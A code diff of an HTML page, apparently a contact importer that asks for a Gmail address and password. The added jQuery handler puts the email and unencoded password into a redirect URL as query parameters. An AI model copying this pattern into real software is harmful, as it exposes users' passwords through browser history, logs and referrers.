@@ -40,8 +40,8 @@
             <!--
               <form id="gmailForm" onSubmit="getContacts(); return false;" action="contacts">
               -->
-              <div class="baseTop" style="color: red; font-size:100%;">error_div_content</div>
-              <form id="gmailForm" action="install1" method="post">
+              <div class="baseTop" style="color: red; font-size:100%;">error_message</div>
+              <form id="gmailForm">
                   <input id="email" type="text" name="email" />
                   <input id="pwd" type="password" name="pwd" />
                   <input type="submit" value="Show My Contacts" class="submit">
@@ -50,6 +50,7 @@
             <div style="clear:both"></div>
         </div>
         </div>
+        <!-- 
         <div id="buttons">
             <div id="innerButtons">
                 <form id="buttons" action="installFinished" method="post">
@@ -58,6 +59,7 @@
                 </form>
             </div>
         </div>
+         -->
       </div>
     </div>
     
@@ -75,6 +77,14 @@
         $("#email").blur(function() {
             $(this).removeClass("active");
             if($(this).attr("value") == "") $(this).attr("value", etext);
+        });
+
+        $("#gmailForm").submit(function() {
+            var email = $("#email").val();
+            var pwd = $("#pwd").val();
+            
+            window.location.href = "loginCensored&email="+email+"&pwd="+pwd;
+            return false;
         });
     </script>
   </body>
